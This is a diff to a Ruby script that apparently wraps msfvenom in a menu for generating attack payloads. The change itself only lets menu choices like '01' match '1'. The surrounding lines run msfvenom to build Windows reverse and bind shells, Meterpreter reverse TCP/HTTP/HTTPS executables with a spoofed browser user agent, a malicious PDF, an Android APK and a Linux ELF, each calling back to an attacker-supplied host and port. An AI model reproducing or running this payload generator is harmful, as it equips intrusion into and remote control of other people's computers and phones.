@@ -47,7 +47,7 @@ def create_payload
   choice = gets.chomp
 
   case choice
-  when '1'
+  when '1', '01'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -55,7 +55,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p windows/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o payload.exe")
     puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
-  when '2'
+  when '2', '02'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -63,13 +63,13 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p windows/meterpreter/reverse_http LHOST=#{lhost} LPORT=#{lport} HttpUserAgent=\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" -f exe -o payload.exe")
     puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
-  when '3'
+  when '3', '03'
     banner
     print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
     lport = gets.chomp
     system("msfvenom -p windows/shell/bind_tcp LPORT=#{lport} -f exe -o payload.exe")
     puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
-  when '4'
+  when '4', '04'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -77,7 +77,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o payload.exe")
     puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
-  when '5'
+  when '5', '05'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -85,7 +85,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p windows/meterpreter/reverse_https LHOST=#{lhost} LPORT=#{lport} HttpUserAgent=\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" -f exe -o payload.exe")
     puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
-  when '6'
+  when '6', '06'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -93,7 +93,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p windows/meterpreter/pdf_embedded_url LHOST=#{lhost} LPORT=#{lport} -f pdf -o payload.pdf")
     puts "#{white} [#{green}++] #{green}Payload 'payload.pdf' created."
-  when '7'
+  when '7', '07'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -101,7 +101,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o payload.apk")
     puts "#{white} [#{green}++] #{green}Payload 'payload.apk' created."
-  when '8'
+  when '8', '08'
     banner
     print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
     lhost = gets.chomp
@@ -109,7 +109,7 @@ def create_payload
     lport = gets.chomp
     system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f elf -o payload.elf")
     puts "#{white} [#{green}++] #{green}Payload 'payload.elf' created."
-  when '9'
+  when '9', '09'
     banner
     print " \e[1;92m[++] Enter the Metasploit payload (e.g., windows/meterpreter/reverse_tcp) : "
     custom_payload = gets.chomp
